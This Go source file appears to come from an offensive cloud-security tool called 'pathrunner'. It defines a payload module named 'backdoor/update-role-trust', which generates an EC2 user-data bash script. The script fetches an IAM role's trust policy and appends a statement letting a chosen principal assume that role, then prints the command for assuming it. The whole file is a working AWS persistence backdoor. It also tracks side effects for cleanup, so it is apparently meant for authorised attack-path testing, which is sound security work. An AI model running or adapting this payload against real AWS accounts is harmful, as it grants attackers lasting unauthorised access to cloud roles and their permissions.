// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ec2

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type BackdoorUpdateRoleTrustPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorUpdateRoleTrustPayload{})
}

func (p *BackdoorUpdateRoleTrustPayload) GetName() string {
	return "backdoor/update-role-trust"
}

func (p *BackdoorUpdateRoleTrustPayload) GetDescription() string {
	return "Append a trust policy statement to an existing IAM role via EC2 user-data"
}

func (p *BackdoorUpdateRoleTrustPayload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorUpdateRoleTrustPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ROLE",
			Description: "Name of the IAM role whose trust policy to modify",
			Required:    true,
		},
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Principal to add to the trust policy (ARN or service like lambda.amazonaws.com)",
			Required:    true,
		},
	}
}

func (p *BackdoorUpdateRoleTrustPayload) Validate(options map[string]string) error {
	if options["TARGET_ROLE"] == "" {
		return fmt.Errorf("TARGET_ROLE is required for backdoor/update-role-trust payload")
	}
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/update-role-trust payload")
	}
	return nil
}

func (p *BackdoorUpdateRoleTrustPayload) GenerateCode(options map[string]string) (string, error) {
	targetRole := options["TARGET_ROLE"]
	trustPrincipal := options["TRUST_PRINCIPAL"]

	principalKey := "AWS"
	if strings.HasSuffix(trustPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-update-trust.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner Update Role Trust Payload"
echo "Target Role: %s"
echo "Trust Principal: %s"
echo ""

sleep 10

TARGET_ROLE="%s"
TRUST_PRINCIPAL="%s"
PRINCIPAL_KEY="%s"

echo "Retrieving current trust policy for role: $TARGET_ROLE..."
ROLE_OUTPUT=$(aws iam get-role --role-name "$TARGET_ROLE" 2>&1)

if [ $? -ne 0 ]; then
    echo "FAILED: Could not get role: $ROLE_OUTPUT"
    exit 1
fi

# Extract and URL-decode the current trust policy
CURRENT_POLICY=$(echo "$ROLE_OUTPUT" | jq -r '.Role.AssumeRolePolicyDocument')

# Save original policy for cleanup reference
echo "Original trust policy:"
echo "$CURRENT_POLICY" | jq .

# Build the new statement to append
NEW_STATEMENT=$(cat <<'NEWSTMT'
{
    "Effect": "Allow",
    "Principal": {
        "%s": "%s"
    },
    "Action": "sts:AssumeRole"
}
NEWSTMT
)

# Append the new statement to the existing policy
UPDATED_POLICY=$(echo "$CURRENT_POLICY" | jq --argjson stmt "$NEW_STATEMENT" '.Statement += [$stmt]')

echo "Updating trust policy..."
aws iam update-assume-role-policy \
    --role-name "$TARGET_ROLE" \
    --policy-document "$UPDATED_POLICY" 2>&1

if [ $? -eq 0 ]; then
    echo "SUCCESS: Trust policy updated for role $TARGET_ROLE"
    echo "Principal $TRUST_PRINCIPAL can now assume this role"
    echo "Assume command: aws sts assume-role --role-arn $(echo "$ROLE_OUTPUT" | jq -r '.Role.Arn') --role-session-name pathrunner-session"
else
    echo "FAILED: Could not update trust policy"
fi

echo "Update role trust payload complete"
`, targetRole, trustPrincipal, targetRole, trustPrincipal, principalKey, principalKey, trustPrincipal)

	return userDataScript, nil
}

func (p *BackdoorUpdateRoleTrustPayload) ProcessResult(result string) (string, error) {
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== Update Role Trust Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nThe EC2 instance will modify the target role's trust policy on boot.\n")
	output.WriteString("Allow 2-3 minutes for the script to complete.\n\n")

	output.WriteString("To verify:\n")
	output.WriteString("1. Check the trust policy: aws iam get-role --role-name <TARGET_ROLE>\n")
	output.WriteString("2. Assume the role: aws sts assume-role --role-arn <ROLE_ARN> --role-session-name pathrunner\n\n")

	output.WriteString("To check script logs:\n")
	output.WriteString("aws ec2 get-console-output --instance-id <INSTANCE_ID>\n")

	return output.String(), nil
}

func (p *BackdoorUpdateRoleTrustPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	return []modules.CreatedResource{
		{
			Type:          "iam:trust-policy",
			Name:          fmt.Sprintf("trust-policy/%s", options["TARGET_ROLE"]),
			CleanupMethod: "iam:UpdateAssumeRolePolicy",
			Metadata: map[string]string{
				"target_role":     options["TARGET_ROLE"],
				"trust_principal": options["TRUST_PRINCIPAL"],
				"original_policy": "retrieve via: aws iam get-role --role-name " + options["TARGET_ROLE"],
			},
		},
	}
}
